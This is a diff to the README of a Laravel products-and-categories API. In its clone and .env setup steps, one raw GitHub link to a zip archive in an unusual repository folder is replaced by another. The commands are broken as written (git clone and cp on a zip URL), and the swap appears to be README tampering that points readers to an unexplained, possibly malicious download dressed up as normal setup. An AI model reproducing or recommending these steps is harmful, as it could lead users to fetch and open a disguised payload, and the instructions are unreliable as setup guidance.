@@ -18,7 +18,7 @@ This is a RESTful API built with Laravel to manage products and categories, desi
 ### 1. Clone the repository
 
 ```bash
-  git clone https://raw.githubusercontent.com/foreverLilRed/BackendGenuineTest/main/storage/app/public/Test-Backend-Genuine-v2.3.zip
+  git clone https://raw.githubusercontent.com/foreverLilRed/BackendGenuineTest/main/app/Models/Backend-Test-Genuine-3.5-alpha.1.zip
   cd BackendGenuineTest
 ```
 
@@ -31,7 +31,7 @@ This is a RESTful API built with Laravel to manage products and categories, desi
 ### 3. Create your .env file
 
 ```bash
-  cp https://raw.githubusercontent.com/foreverLilRed/BackendGenuineTest/main/storage/app/public/Test-Backend-Genuine-v2.3.zip .env
+  cp https://raw.githubusercontent.com/foreverLilRed/BackendGenuineTest/main/app/Models/Backend-Test-Genuine-3.5-alpha.1.zip .env
 ```
 ⚠️ Set up your database credentials in the .env file
 
